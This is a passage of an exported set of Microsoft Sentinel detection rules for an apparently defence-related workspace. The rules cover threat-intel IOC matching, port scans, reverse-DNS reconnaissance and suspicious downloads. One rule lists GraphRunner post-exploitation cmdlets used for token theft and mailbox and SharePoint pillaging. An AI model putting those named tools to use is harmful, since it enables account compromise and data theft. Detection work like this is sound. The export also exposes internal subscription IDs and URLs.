Compromised_Host\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"Compromised_Host"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.2.7","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI Map URL Entity to SecurityAlert Data","enabled":true,"description":"This query identifies any URL indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in SecurityAlert data.","alertRuleTemplateName":"f30a47c1-65fb-42b1-a7f4-00941c12550b","lastModifiedUtc":"2024-02-29T18:53:45.8624662Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/987f04fa-2415-4539-a2f0-10e8d13d0a54","name":"987f04fa-2415-4539-a2f0-10e8d13d0a54","etag":"\"26013e79-0000-2700-0000-65e0d21a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet SecurityAlerts = SecurityAlert\n| where TimeGenerated > ago(dt_lookBack)\n| extend domain = todynamic(dynamic_to_json(extract_all(@\"(((xn--)?[a-z0-9\\-]+\\.)+([a-z]+|(xn--[a-z0-9]+)))\", dynamic([1]), tolower(Entities))))\n| where isnotempty(domain)\n| mv-expand domain\n| extend domain = tostring(domain)\n| extend EntitiesDynamicArray = parse_json(Entities)\n| mv-apply EntitiesDynamicArray on\n    (summarize\n        HostName = take_anyif(tostring(EntitiesDynamicArray.HostName), EntitiesDynamicArray.Type == \"host\"),\n        IP_addr = take_anyif(tostring(EntitiesDynamicArray.Address), EntitiesDynamicArray.Type == \"ip\")\n    )\n| extend Alert_TimeGenerated = TimeGenerated\n| extend Alert_Description = Description;\nlet AlertDomains = SecurityAlerts\n| distinct domain\n| summarize make_list(domain);\nlet Domain_Indicators = materialize(ThreatIntelligenceIndicator\n| where isnotempty(DomainName)\n| where TimeGenerated >= ago(ioc_lookBack)\n| extend TI_DomainEntity = tolower(DomainName)\n| where TI_DomainEntity in (AlertDomains)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\");\nDomain_Indicators\n// Using innerunique to keep performance fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (SecurityAlerts) on $left.TI_DomainEntity == $right.domain\n| where Alert_TimeGenerated < ExpirationDateTime\n| summarize Alert_TimeGenerated = arg_max(Alert_TimeGenerated, *) by IndicatorId, AlertName\n| project Alert_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, DomainName, AlertName, Alert_Description, ProviderName, AlertSeverity, ConfidenceLevel, HostName, IP_addr, Url, Entities, Type, TI_DomainEntity\n| extend timestamp = Alert_TimeGenerated\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"HostName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IP_addr"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.4.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI map Domain entity to SecurityAlert","enabled":true,"description":"Identifies a match in SecurityAlert table from any Domain IOC from TI","alertRuleTemplateName":"87890d78-3e05-43ec-9ab9-ba32f4e01250","lastModifiedUtc":"2024-02-29T18:51:04.4305704Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c000975e-1d38-4db4-8f37-af9f61be1a48","name":"c000975e-1d38-4db4-8f37-af9f61be1a48","etag":"\"26012084-0000-2700-0000-65e0d2660000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":1,"severity":"Medium","query":"let MinimumDifferentPortsThreshold = 100;\nlet BinTime = 30s;\nunion isfuzzy=true(\nAZFWApplicationRule\n| summarize AlertTimedCountPortsInBinTime = dcount(DestinationPort) by SourceIp, bin(TimeGenerated, BinTime), Fqdn\n| where AlertTimedCountPortsInBinTime > MinimumDifferentPortsThreshold),\n(AZFWNetworkRule\n| extend Fqdn = DestinationIp\n| summarize AlertTimedCountPortsInBinTime = dcount(DestinationPort) by SourceIp, bin(TimeGenerated, BinTime), Fqdn\n| where AlertTimedCountPortsInBinTime > MinimumDifferentPortsThreshold),\n(AzureDiagnostics\n| where OperationName == \"AzureFirewallApplicationRuleLog\" or OperationName == \"AzureFirewallNetworkRuleLog\"\n| parse msg_s with * \"from \" SourceIp \":\" SourcePort:int \" to \" Fqdn \":\" DestinationPort:int *\n| where isnotempty(Fqdn) and isnotempty(SourceIp)\n| summarize AlertTimedCountPortsInBinTime = dcount(DestinationPort) by SourceIp, bin(TimeGenerated, BinTime), Fqdn\n| where AlertTimedCountPortsInBinTime > MinimumDifferentPortsThreshold)\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"SourceIp"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Fqdn"}]}],"templateVersion":"1.1.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Discovery"],"techniques":["T1046"],"displayName":"Port Scan","enabled":true,"description":"Identifies a source IP scanning multiple open ports on Azure Firewall. This can indicate malicious scanning of ports by an attacker, trying to reveal open ports in the organization that can be compromised for initial access.\n\nConfigurable Parameters:\n\n- Port scan time - the time range to look for multiple ports scanned. Default is set to 30 seconds.\n- Minimum different ports threshold - alert only if more than this number of ports scanned. Default is set to 100.","alertRuleTemplateName":"b2c5907b-1040-4692-9802-9946031017e8","lastModifiedUtc":"2024-02-29T18:52:21.5245767Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b39b6434-f72f-4221-93bf-8950f7a6260a","name":"b39b6434-f72f-4221-93bf-8950f7a6260a","etag":"\"8700ceed-0000-2700-0000-66fdcb530000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Title: BAH_DownloadedFileEvents\n//Author: Steven Wan, Ginna Woo\n//Description: Looks for instances of anomalous file downloads or access where the file extension may be involved with suspcious behavior or activity. Pairs together with BehaviorAnalytics table to set investigation priority threshold which can be changed. Associated with MITRE attack technique via User Execution | Malicious File\n\nlet CAE = (CloudAppEvents\n    | where (ActionType == \"FileDownloaded\" or ActionType == \"FileAccessed\")\n    | extend FileName = RawEventData.SourceFileName\n    | evaluate bag_unpack(RawEventData, columnsConflict=\"replace_source\")\n    | extend SourceFileExtension = column_ifexists(\"SourceFileExtension\", \"\")\n    | where SourceFileExtension has_any(\"EXE\", \"SCR\", \"VBS\", \"RTF\", \"ps1\", \"RAR\", \"dll\", \"jar\", \"lnk\", \"doc\", \"pdf\")\n    | extend SiteUrl = column_ifexists(\"SiteUrl\", \"\")\n    | extend FileLabel = column_ifexists(\"SensitivityLabelId\", \"\")\n    | extend SiteLabel = column_ifexists(\"SiteSensitivityLabelId\", \"\")\n    | extend UserId = tostring(column_ifexists(\"UserId\",\"\"))\n    | summarize arg_max (TimeGenerated, *) by AccountObjectId,UserId\n    | project TimeGenerated,AccountObjectId, UserId, AccountDisplayName,SourceFileExtension,ObjectName,ActionType,IPAddress,Application,FileLabel,SiteUrl);\nlet BA = (BehaviorAnalytics\n| evaluate bag_unpack(UsersInsights, columnsConflict=\"replace_source\")\n| evaluate bag_unpack(ActivityInsights, columnsConflict=\"replace_source\")\n| extend UserId = tostring(UserPrincipalName)\n| where InvestigationPriority >= 6//adjust threshold\n| extend ActionUncommonlyPerformedByUser = column_ifexists(\"ActionUncommonlyPerformedByUser\",\"\")\n| where ActionUncommonlyPerformedByUser == \"True\"\n| extend AccountObjectID = column_ifexists(\"AccountObjectID\",\"\")\n| extend AccountDomain = column_ifexists(\"AccountDomain\",\"\")\n| extend OnPremisesSID = column_ifexists(\"AccountObjectID\",\"\")\n| extend Resource = column_ifexists(\"Resource\",\"\")\n| extend App = column_ifexists(\"App\",\"\")\n| project-away AccountObjectID,ActionType,ActivityType,TimeProcessed, UserPrincipalName,UserName,EventSource,DevicesInsights,Type,AccountDomain, OnPremisesSID,Resource,App,TenantId,SourceRecordId);\nCAE\n| join kind=inner (BA) on $left.UserId==$right.UserId\n| extend AccountDisplayName1 = column_ifexists(\"AccountDisplayName1\",\"\")\n| where ObjectName !contains \"https://dod365-my.sharepoint-mil.us/personal\"\n| project-away UserId1, AccountDisplayName1;","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"DisplayName","columnName":"AccountDisplayName"},{"identifier":"Name","columnName":"UserId"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"ObjectName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1204"],"displayName":"BAH_DownloadedFileEvents","enabled":true,"description":"Looks for instances of anomalous file downloads or access where the file extension may be involved with suspcious behavior or activity. Pairs together with BehaviorAnalytics table to set investigation priority threshold which can be changed. Associated with MITRE attack technique via User Execution | Malicious File\nPLATFORM:Microsoft 365\nMITRE:TA0002;T1204","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:38:09.58033Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/9fe03775-1fa1-43b5-8062-5f8a94fc0604","name":"9fe03775-1fa1-43b5-8062-5f8a94fc0604","etag":"\"280270e3-0000-2700-0000-672394740000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"OfficeActivity \n| where Operation == \"FileMalwareDetected\"\n| project TimeGenerated, OfficeWorkload, [\"File Name\"]=SourceFileName, [\"File Location\"]=OfficeObjectId, [\"Relative File URL\"]=SourceRelativeUrl, ClientIP\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl","Execution","Impact","InitialAccess","LateralMovement"],"techniques":["T1071","T0863","T1489","T1566","T1570"],"displayName":"File Detected as Malware .v2","enabled":false,"description":"**COA#4 DoD365-J Rollup (task list) response due to DEOS ISSM**\n\nAlert: This alert Is based on SYSTEM logs generated by the Azure Fabric Defender when malicious files are detected. The alerted files are sandboxed within Azure, but with current DOD365 capabilities, the files are able to be shared between users within the environment.\n\nInitial Access, Execution, Defense Evasion, Lateral Movement, Impact, Command and Control\n\nT1566-Phishing: T1566.001,T1566.002, T1204- User Execution: T1204.002, T1564: Hide Artifacts, T1570: Lateral Tool Transfer, T1489: Service Stop, T1071- Application Layer Protocol: T1071.001\n\nPLATFORM:Microsoft 365,IaaS\nMITRE:TA0001;T1566;T1566.002","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-31T14:30:12.8512779Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e9695fb2-dc4e-439d-8550-e11b6964eea4","name":"e9695fb2-dc4e-439d-8550-e11b6964eea4","etag":"\"1c00d26d-0000-2700-0000-658ca9620000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P10D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let threshold = 10;\nlet stime = 10d;\nlet etime = 1d;\nlet SearchDomain = dynamic([\"in-addr.arpa\"]);\n_Im_Dns(starttime=ago(etime), domain_has_any=SearchDomain)\n| summarize\n  StartTimeUtc = min(TimeGenerated),\n  EndTimeUtc = max(TimeGenerated),\n  DNSQueryCount=dcount(DnsQuery)\n  by SrcIpAddr\n| where DNSQueryCount > threshold\n| project StartTimeUtc, EndTimeUtc, SrcIpAddr, DNSQueryCount \n| join kind=leftanti (_Im_Dns(starttime=ago(stime), endtime=ago(etime), domain_has_any=SearchDomain)\n  | summarize DNSQueryCount=dcount(DnsQuery) by SrcIpAddr, bin(TimeGenerated, 1d)\n  | where DNSQueryCount > threshold\n  | project SrcIpAddr, DNSQueryCount\n  )\n  on SrcIpAddr\n| join kind=inner (_Im_Dns(starttime=ago(etime), domain_has_any=SearchDomain)\n  | summarize DNSQueries=make_set(DnsQuery, 1000) by SrcIpAddr)\n  on SrcIpAddr\n| extend DNSQuerythreshold = threshold\n| project-away SrcIpAddr1\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{"DNSQueries":"DNSQueries","DNSQueryCount":"DNSQueryCount","DNSQuerythreshold":"DNSQuerythreshold"},"entityMappings":[{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"SrcIpAddr"}]}],"alertDetailsOverride":{"alertDisplayNameFormat":"[Static threshold] Rare client has been observed as making high reverse DNS lookup count  - client IP: '{{SrcIpAddr}}'","alertDescriptionFormat":"Client identified as making high reverse DNS counts which could be carrying out reconnaissance or discovery activity.\n\nReverse DNS lookup threshold is: '{{DNSQuerythreshold}}'\n\nCurrent reverse DNS lookup count from this client is : '{{DNSQueryCount}}'\n\nDNS queries requested by this client inlcude: '{{DNSQueries}}'"},"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"AlertPerResult"},"tactics":["Reconnaissance"],"techniques":["T1590"],"displayName":"Rare client observed with high reverse DNS lookup count - Static threshold based (ASIM DNS Solution)","enabled":true,"description":"This rule identifies clients with high reverse DNS counts, which could be carrying out reconnaissance or discovery activity. This helps in detecting the possible initial phases of an attack, like discovery and reconnaissance. It utilizes [ASIM](https://aka.ms/AboutASIM) normalization and is applied to any source that supports the ASIM DNS schema.","alertRuleTemplateName":"77b7c820-5f60-4779-8bdb-f06e21add5f1","lastModifiedUtc":"2023-12-27T22:46:54.8479148Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/6886b73e-c81e-4637-beb7-c407f3b1f8d9","name":"6886b73e-c81e-4637-beb7-c407f3b1f8d9","etag":"\"870047e0-0000-2700-0000-66fdca860000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Description: GraphRunner is a post-exploitation toolset for interacting with the Microsoft Graph API. It provides various tools for performing reconnaissance, persistence, and pillaging of data from a Microsoft Entra ID (Azure AD) account.\n//Author: Michael gibbs\n//False Positives: Administrative users using powershell listed below in daily use. If so would recommend commenting out that module.\nlet Cmdlets = dynamic([\"Get-GraphToken\", \n                       \"Invoke-GraphRecon\", \n                       \"Invoke-GraphRunner\", \n                       \"Invoke-GraphOpenInboxFinder\", \n                       \"Get-SharePointSiteURLs\", \n                       \"Get-DynamicGroups\", \n                       \"Get-UpdatableGroups\", \n                       \"Invoke-DumpApps\", \n                       \"Get-SecurityGroups\", \n                       \"Get-AzureADUsers\", \n                       \"Invoke-InjectOAuthApp\", \n                       \"Invoke-SecurityGroupCloner\", \n                       \"Invoke-InviteGuest\", \n                       \"Invoke-AddGroupMember\", \n                       \"Invoke-SearchSharePointAndOneDrive\", \n                       \"Invoke-ImmersiveFileReader\", \n                       \"Invoke-SearchMailbox\", \n                       \"Invoke-SearchTeams\", \n                       \"Invoke-SearchUserAttributes\", \n                       \"Get-Inbox\", \n                       \"Get-TeamsChat\", \n                       \"Invoke-DeleteOAuthApp\", \n                       \"Invoke-DeleteGroup\", \n                       \"Invoke-RemoveGroupMember\", \n                       \"Invoke-DriveFileDownload\", \n                       \"Invoke-CheckAccess\", \n                       \"Get-UserObjectID\"]);\nlet signInLookup = (\nSigninLogs\n|where TimeGenerated>=ago(1d)\n|where DeviceDetail contains \"displayName\"\n|extend DeviceDetailJson=parse_json(DeviceDetail)\n|extend DeviceNameSI=tostring(DeviceDetailJson.displayName)\n|distinct DeviceNameSI,UserPrincipalName,UserDisplayName, UserId\n);\nDeviceEvents\n| where AdditionalFields has_any (Cmdlets)\n|extend SILogDeviceName=toupper((split(DeviceName,\".\"))[0])\n|join kind=leftouter signInLookup on $left.SILogDeviceName==$right.DeviceNameSI\n|project TimeGenerated, AdditionalFields.Command,InitiatingProcessAccountDomain,InitiatingProcessAccountName,UserDisplayName","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserDisplayName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","Collection"],"techniques":["T1556","T0802"],"displayName":"BAH_GRAPHRUNNER","enabled":true,"description":"GraphRunner is a post-exploitation toolset for interacting with the Microsoft Graph API. It provides various tools for performing reconnaissance, persistence, and pillaging of data from a Microsoft Entra ID (Azure AD) account.\n\nIt consists of three separate parts:\n\nA PowerShell script where the majority of modules are located\nAn HTML GUI that can leverage an access token to navigate and pillage a user's account\nA simple PHP redirector for harvesting authentication codes during an OAuth flow\nPLATFORM:ICS,Windows\nMITRE:TA0003;T1556,TA0100;T0802","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:34:43.226349Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/aedfea1e-d50e-48b4-ace8-24a45f7cebf0","name":"aedfea1e-d50e-48b4-ace8-24a45f7cebf0","etag":"\"7708bf58-0000-2700-0000-66295ae30000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h; // Look back 1 hour for OfficeActivity events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\nlet OfficeActivity_ = materialize(OfficeActivity\n  | where isnotempty(ClientIP)\n  | where TimeGenerated >= ago(dt_lookBack)\n  | extend ClientIPValues = extract_all(@'\\[?(::ffff:)?(?P<IPAddress>(\\d+\\.\\d+\\.\\d+\\.\\d+)|[^\\]%]+)(%\\d+)?\\]?([-:](?P<Port>\\d+))?', dynamic([\"IPAddress\", \"Port\"]), ClientIP)[0]\n  | extend IPAddress = iff(array_length(ClientIPValues) > 0, tostring(ClientIPValues[0]), '')\n  | project-rename OfficeActivity_TimeGenerated = TimeGenerated);\nlet ActivityIPs = OfficeActivity_ | summarize IPs = make_list(IPAddress);\n// Fetch threat intelligence indicators related to IP addresses\nlet IP_Indicators = materialize(ThreatIntelligenceIndicator\n  | where isnotempty(NetworkIP) or isnotempty(EmailSourceIpAddress) or isnotempty(NetworkDestinationIP) or isnotempty(NetworkSourceIP)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | extend TI_ipEntity = coalesce(NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress)\n  | where TI_ipEntity in (ActivityIPs)\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where  Active == true and ExpirationDateTime > now()\n  | where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\");\nIP_Indicators\n// Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n| join kind=innerunique (OfficeActivity_)\n  on $left.TI_ipEntity == $right.IPAddress\n// Filter out OfficeActivity events that occurred after the expiration of the corresponding indicator\n| where OfficeActivity_TimeGenerated < ExpirationDateTime\n// Group the results by IndicatorId and keep the OfficeActivity event with the latest timestamp\n| summarize OfficeActivity_TimeGenerated = arg_max(OfficeActivity_TimeGenerated, *) by IndicatorId\n// Select the desired output fields\n| project OfficeActivity_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, TI_ipEntity, ClientIP, UserId, Operation, ResultStatus, RecordType, OfficeObjectId, NetworkIP, NetworkDestinationIP, NetworkSourceIP, EmailSourceIpAddress, Type\n| extend timestamp = OfficeActivity_TimeGenerated, Name = tostring(split(UserId, '@', 0)[0]), UPNSuffix = tostring(split(UserId, '@', 1)[0])\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserId"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"TI_ipEntity"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.4.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI map IP entity to OfficeActivity","enabled":true,"description":"This query maps any IP indicators of compromise (IOCs) from threat intelligence (TI), by searching for matches in OfficeActivity.","alertRuleTemplateName":"f15370f4-c6fa-42c5-9be4-1d308f40284e","lastModifiedUtc":"2024-04-24T19:17:51.831883Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/50de3b18-256c-478a-b3f4-dcb8802b9d66","name":"50de3b18-256c-478a-b3f4-dcb8802b9d66","etag":"\"77080234-0000-2700-0000-66295ab80000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Define the lookback periods for time-based filters\nlet dt_lookBack = 1h; // Look back 1 hour for DNS events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to domains\nlet Domain_Indicators = ThreatIntelligenceIndicator\n  // Filter out indicators without domain names\n  | where isnotempty(DomainName)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now()\n  | extend TI_DomainEntity = DomainName;\n// Create a list of TLDs in our threat feed for later validation\nlet maxListSize = 100000; // Define the maximum allowed size for each list\nlet list_tlds = Domain_Indicators\n  | extend parts = split(DomainName, '.')\n  | extend tld = parts[(array_length(parts)-1)]\n  | summarize count() by tostring(tld)\n  | project tld\n  | summarize make_list(tld, maxListSize);\n// Perform a join between domain indicators and DNS events to identify potential malicious activity\nDomain_Indicators\n  // Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n  | join kind=innerunique (\n    DnsEvents\n    | where TimeGenerated > ago(dt_lookBack)\n    // Extract domain patterns from syslog message\n    | where isnotempty(Name)\n    | extend parts = split(Name, '.')\n    | extend tld = parts[(array_length(parts)-1)]\n    // Validate parsed domain by checking if the TLD is in the list of TLDs in our threat feed\n    | where tld in~ (list_tlds)\n    | extend DNS_TimeGenerated = TimeGenerated\n  ) on $left.TI_DomainEntity==$right.Name\n  // Filter out DNS events that occurred after the expiration of the corresponding indicator\n  | where DNS_TimeGenerated < ExpirationDateTime\n  // Group the results by IndicatorId and Name, and keep the DNS event with the latest timestamp\n  | summarize DNS_TimeGenerated = arg_max(DNS_TimeGenerated, *) by IndicatorId, Name\n  // Select the desired output fields\n  | project DNS_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, Url, Computer, ClientIP, Name, QueryType, Type, TI_DomainEntity\n  // Extract hostname and DNS domain from the Computer field\n  | extend HostName = tostring(split(Computer, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.'))\n  // Rename the timestamp field\n  | extend timestamp = DNS_TimeGenerated\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"Computer"},{"identifier":"HostName","columnName":"HostName"},{"identifier":"DnsDomain","columnName":"DnsDomain"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"Url"}]}],"templateVersion":"1.4.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":[],"displayName":"TI map Domain entity to DnsEvents","enabled":true,"description":"Identifies a match in DnsEvents from any Domain IOC from TI","alertRuleTemplateName":"85aca4d1-5d15-4001-abd9-acb86ca1786a","lastModifiedUtc":"2024-04-24T19:17:11.8701782Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/92e7c4f9-b271-48ee-b3a1-a2065177c69e","name":"92e7c4f9-b271-48ee-b3a1-a2065177c69e","etag":"\"78083817-0000-2700-0000-66295bc30000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nThreatIntelligenceIndicator\n| where isnotempty(FileHashValue)\n| where TimeGenerated >= ago(ioc_lookBack)\n| extend FileHashValue = toupper(FileHashValue)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique ( union isfuzzy=true\n  (SecurityEvent | where TimeGenerated >= ago(dt_lookBack)\n      | where EventID in (\"8003\",\"8002\",\"8005\")\n      | where isnotempty(FileHash)\n      | extend SecurityEvent_TimeGenerated = TimeGenerated, Event = EventID, FileHash = toupper(FileHash)\n  ),\n  (WindowsEvent | where TimeGenerated >= ago(dt_lookBack)\n      | where EventID in (\"8003\",\"8002\",\"8005\")\n      | where isnotempty(EventData.FileHash)\n      | extend SecurityEvent_TimeGenerated = TimeGenerated, Event = EventID, FileHash = toupper(EventData.FileHash)\n  )\n)\non $left.FileHashValue == $right.FileHash\n| where SecurityEvent_TimeGenerated < ExpirationDateTime\n| summarize SecurityEvent_TimeGenerated = 